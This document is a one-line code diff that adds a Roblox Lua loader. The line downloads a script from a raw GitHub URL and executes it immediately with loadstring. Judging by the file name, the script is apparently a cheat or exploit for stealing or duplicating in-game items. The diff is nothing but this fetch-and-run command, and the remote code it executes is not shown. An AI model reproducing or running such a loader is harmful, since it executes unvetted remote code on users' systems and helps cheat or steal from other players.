@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/clone-to-steal-eggs-spam2-3dh4jwqngq17u8.lua"))()
